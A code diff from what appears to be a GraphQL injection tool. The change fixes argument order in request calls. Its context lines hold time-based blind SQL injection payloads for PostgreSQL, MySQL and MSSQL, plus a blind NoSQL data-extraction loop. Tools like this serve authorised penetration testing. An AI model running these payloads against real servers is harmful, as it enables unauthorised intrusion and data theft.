@@ -1,6 +1,7 @@
 #!/usr/bin/python
 from utils import *
 import re
+import time
 
 def display_types(URL, method, headers, use_json, proxy):
     payload = "{__schema{types{name}}}"
@@ -133,7 +134,7 @@ def blind_postgresql(url, method, proxy, headers, use_json):
     payload = "1 AND pg_sleep(30) --"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    requester(url, method, injected, headers, use_json, proxy)
+    requester(url, method, injected, proxy, headers, use_json)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
@@ -142,7 +143,7 @@ def blind_mysql(url, method, proxy, headers, use_json):
     payload = "'-SLEEP(30); #"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    requester(url, method, injected, headers, use_json, proxy)
+    requester(url, method, injected, proxy, headers, use_json)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
@@ -151,7 +152,7 @@ def blind_mssql(url, method, proxy, headers, use_json):
     payload = "'; WAITFOR DELAY '00:00:30';"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    requester(url, method, injected, headers, use_json, proxy)
+    requester(url, method, injected, proxy, headers, use_json)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
@@ -171,7 +172,7 @@ def blind_nosql(url, method, proxy, headers, use_json):
         old_data = data
         for c in charset:
             injected = query.replace("BLIND_PLACEHOLDER", data + c)
-            r = requester(url, method, injected, headers, use_json, proxy)
+            r = requester(url, method, injected, proxy, headers, use_json)
             if check in r.text:
                 data += c
                 # display data and update the current line
